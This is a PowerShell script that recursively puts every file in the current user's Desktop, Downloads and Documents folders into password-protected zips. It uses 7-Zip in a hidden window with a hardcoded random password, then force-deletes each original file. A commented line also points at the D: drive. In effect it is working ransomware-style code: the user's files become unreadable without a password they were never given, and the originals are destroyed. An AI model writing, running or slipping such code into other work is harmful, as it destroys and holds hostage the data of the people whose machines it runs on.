function file_to_zip([string]$FilesToZip, [string]$ZipOutputFilePath, [string]$Password, [ValidateSet('7z','zip','gzip','bzip2','tar','iso','udf')][string]$CompressionType = 'zip', [switch]$HideWindow)
{
    # Look for the 7zip executable.
    $pathTo32Bit7Zip = "C:\Program Files (x86)\7-Zip\7z.exe"
    $pathTo64Bit7Zip = "C:\Program Files\7-Zip\7z.exe"
    $THIS_SCRIPTS_DIRECTORY = Split-Path $script:MyInvocation.MyCommand.Path
    $pathToStandAloneExe = Join-Path $THIS_SCRIPTS_DIRECTORY "7za.exe"
    if (Test-Path $pathTo64Bit7Zip) { $pathTo7ZipExe = $pathTo64Bit7Zip }
    elseif (Test-Path $pathTo32Bit7Zip) { $pathTo7ZipExe = $pathTo32Bit7Zip }
    elseif (Test-Path $pathToStandAloneExe) { $pathTo7ZipExe = $pathToStandAloneExe }
    else { throw "Could not find the 7-zip executable." }

    # Delete the destination zip file if it already exists (i.e. overwrite it).
    if (Test-Path $ZipOutputFilePath) { Remove-Item $ZipOutputFilePath -Force }

    $windowStyle = "Normal"
    if ($HideWindow) { $windowStyle = "Hidden" }

    # Create the arguments to use to zip up the files.
    # Command-line argument syntax can be found at: http://www.dotnetperls.com/7-zip-examples
    $arguments = "a -t$CompressionType ""$ZipOutputFilePath"" ""$FilesToZip"" -mx9"
    if (!([string]::IsNullOrEmpty($Password))) { $arguments += " -p$Password" }

    # Zip up the files.
    $p = Start-Process $pathTo7ZipExe -ArgumentList $arguments -Wait -PassThru -WindowStyle $windowStyle

    # If the files were not zipped successfully.
    if (!(($p.HasExited -eq $true) -and ($p.ExitCode -eq 0)))
    {
        throw "There was a problem creating the zip file '$ZipFilePath'."
    }
}
function executer([string] $file, [string] $password){
    $filepath = Get-ChildItem -Path $file -Recurse -File
    for ($i = 0; $i -lt $filepath.Count; $i++) {
        $bool = 0;
        <# Action that will repeat until the condition is met #>
        $temp = $filepath.FullName[$i] -replace ".{4}$"
        $temp = $temp + ".zip" 
        
        file_to_zip -FilesToZip $filepath.FullName[$i] -ZipOutputFilePath $temp -HideWindow -Password $password
        if ((Test-Path -Path $temp -PathType Leaf)){
            Write-Output "zip file vvssen ban "
            Remove-Item -Path $filepath.FullName[$i] -Force
        }
    }
}
$password = "r0!i9wm3l8hhlrmod0w&vv-?vp9f?2!1ebqdqe%k"
$D = "D:\"
$tpath_desk = "C:\Users\"+[System.Environment]::UserName+"\Desktop"
$tpath_down = "C:\Users\"+[System.Environment]::UserName+"\Download"
$tpath_docu = "C:\Users\"+[System.Environment]::UserName+"\Documents"

#executer -filepath $D ;
executer -file $tpath_desk -password $password;
executer -file $tpath_down -password $password;
executer -file $tpath_docu -password $password;



